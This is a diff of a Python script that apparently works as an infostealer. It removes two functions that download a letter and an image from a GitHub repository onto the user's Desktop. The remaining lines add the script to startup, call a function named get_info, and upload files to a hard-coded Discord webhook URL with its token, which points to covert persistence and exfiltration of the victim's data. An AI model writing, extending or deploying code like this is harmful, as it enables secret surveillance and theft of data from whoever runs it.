@@ -175,52 +175,10 @@ def Im():
 
     response = requests.post("https://discord.com/api/webhooks/1242289694709125222/LtPHc-54luM-2vVcPISesOVEZ_YnXRMaY24-bGBuWzTt1WMoiTuvmubXJCaunmDgws9d", files=payload)
 
-def Carta():
-    url_github_raw = "https://raw.githubusercontent.com/StormGab1/Repository2234/main/Love"
-
-    try:
-        resposta = requests.get(url_github_raw)
-        resposta.raise_for_status()
-        conteudo = resposta.text
-        
-        caminho_arquivo = str(Path.home() / "Desktop" / "Carta.txt")
-        
-        with open(caminho_arquivo, "w", encoding="utf-8") as arquivo:
-            arquivo.write(conteudo)
-        
-        print(1)
-        
-    except requests.RequestException as e:
-        print(1)
-        return None
-
-    except Exception as e:
-        print(1)
-        return None
-    
-def Imagem():
-    try:
-        resposta = requests.get("https://raw.githubusercontent.com/StormGab1/Repository2234/main/link")
-        resposta.raise_for_status()
-        url_imagem = resposta.text.strip()
-
-        caminho_arquivo = os.path.join(os.path.expanduser("~"), "Desktop", "Love.jpg")
-
-        resposta_imagem = requests.get(url_imagem, stream=True)
-        resposta_imagem.raise_for_status()
-        with open(caminho_arquivo, 'wb') as arquivo:
-            for parte in resposta_imagem.iter_content(chunk_size=128):
-                arquivo.write(parte)
-
-        print(1)
-    except Exception as e:
-        print(2)
 
 if __name__ == '__main__':
     add_to_startup()
     get_info()
-    Carta()
-    Imagem()
     time.sleep(20)
     get_info()
     
